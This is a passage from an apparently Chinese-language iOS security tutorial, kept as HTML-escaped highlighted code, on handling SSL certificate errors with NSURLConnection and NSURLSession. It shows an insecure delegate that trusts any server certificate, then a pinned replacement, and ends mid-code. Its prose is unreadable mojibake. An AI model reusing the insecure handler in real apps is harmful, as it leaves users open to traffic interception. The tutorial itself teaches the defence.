&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;                         &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;è™•ç†æ–¹å¼èˆ‡å‰é¢çš„ Android æƒ…æ³2é¡åŒï¼Œåšäº† certificate pinningã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³3&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;èˆ‡å‰é¢ NSURLConnection çš„æƒ…æ³é¡åŒï¼Œåªæ˜¯é€™è£¡ä½¿ç”¨åˆ°çš„æ˜¯ iOS7  æ–°å¢çš„ NSURLSession å…ƒä»¶ã€‚å°æ‡‰çš„è™•ç†æ–¹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;                                                    &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;                                                             &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
